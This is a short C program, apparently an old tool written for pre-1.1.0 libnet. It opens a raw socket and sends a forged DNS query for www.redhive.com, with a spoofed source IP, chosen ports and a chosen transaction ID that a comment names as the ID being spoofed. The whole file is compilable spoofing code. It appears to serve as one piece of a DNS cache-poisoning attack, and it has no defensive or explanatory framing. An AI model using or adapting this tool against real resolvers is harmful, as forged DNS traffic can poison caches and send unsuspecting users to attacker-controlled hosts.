/*
    deprecated - uses libnet prior to 1.1.0
*/

#include <libnet.h>
#include <pcap.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/socket.h>
#include <unistd.h>
#include <strings.h>

/* usage: ask_dns <source_ip> <port> <destination_ip> <port> <dns_id> */

int main (int argc, char **argv)   {
    u_long  src_ip,                 /* source address          */
            dst_ip;                 /* destination address     */
    u_short src_port,               /* source port             */
            dst_port,               /* destination port        */
            id;                     /* dns id we are spoofing  */
    int     written_bytes,          /* number of bytes written */
            packet_size,            /* size of our packet      */
            payload_size,           /* size of our payload     */
            socket;                 /* socket to write on      */
    u_char  *packet,                /* we build this           */
            *payload;               /* we send this            */

    if (argc < 6)   {
        printf("\nusage: ask_dns <source_ip> <port> <destination_ip> <port> <dns_id>\n");
        exit (EXIT_FAILURE);
    }

    if ((socket = libnet_open_raw_sock(IPPROTO_RAW)) == -1)
        libnet_error(LIBNET_ERR_FATAL, "network initialization failed\n");

    src_ip   = libnet_name_resolve(argv[1], 0);
    dst_ip   = libnet_name_resolve(argv[3], 0);
    src_port = (u_short) atoi(argv[2]);
    dst_port = (u_short) atoi(argv[4]);
    id       = (u_short) atoi(argv[5]);

    payload      = "\x03\x77\x77\x77\x07\x72\x65\x64\x68\x69\x76\x65\x03\x63\x6f\x6d\x00\x00\x01\x00\x01";
    payload_size = 21;

    /*
     *  packet memory allocation
     */

    packet_size = payload_size + LIBNET_IP_H + LIBNET_UDP_H + LIBNET_DNS_H;

    libnet_init_packet(packet_size, &packet);
    if (packet == NULL)
        libnet_error(LIBNET_ERR_FATAL, "libnet_init_packet failed\n");

    /*
     *  ip header construction
     */

    libnet_build_ip(payload_size + LIBNET_UDP_H + LIBNET_DNS_H,
            0,                      /* ip tos              */
            0,                      /* ip id               */
            0,                      /* fragmentation bits  */
            64,                     /* ttl                 */
            IPPROTO_UDP,            /* protocol            */
            src_ip,                 /* source address      */
            dst_ip,                 /* destination address */
            NULL,                   /* payload             */
            0,                      /* payload length      */
            packet);                /* packet buffer       */

     /*
      * udp header construction
      * during debugging i found that we weren't generating the correct
      * length here, that is why a payload length is included (payload + dns_header)
      * it really shouldn't be here though
      */

    libnet_build_udp(src_port,      /* source port      */
            dst_port,               /* destination port */
            NULL,                   /* payload          */
            33,                     /* payload length   */
            packet + LIBNET_IP_H);

    /*
     *  dns header construction
     */

    libnet_build_dns(id,            /* dns id                    */
            0x0100,                 /* control flags             */
            1,                      /* number of questions       */
            0,                      /* number of answer RR's     */
            0,                      /* number of authority  RR's */
            0,                      /* number of additional RR's */
            payload,                /* payload                   */
            payload_size,           /* payload length            */
            packet + LIBNET_IP_H + LIBNET_UDP_H);

    /*
     *  calculate checksum
     */

    libnet_do_checksum (packet, IPPROTO_UDP, packet_size - LIBNET_IP_H);

    /*
     *  write packet
     */

    written_bytes = libnet_write_ip(socket, packet, packet_size);

    /*
     *  make sure the number of written bytes jives with what we expect
     */

    if (written_bytes < packet_size)
        libnet_error(LN_ERR_WARNING, "libnet_write_ip only wrote %d of %d bytes\n", written_bytes, packet_size);

    /*
     *  we're done with this packet
     */

    libnet_destroy_packet(&packet);

    /*
     *  we're done writing
     */

    if (libnet_close_raw_sock(socket) == -1)
        libnet_error(LN_ERR_WARNING, "libnet_close_raw_sock couldn't close the interface");

    return (written_bytes == -1 ? EXIT_FAILURE : EXIT_SUCCESS);
}
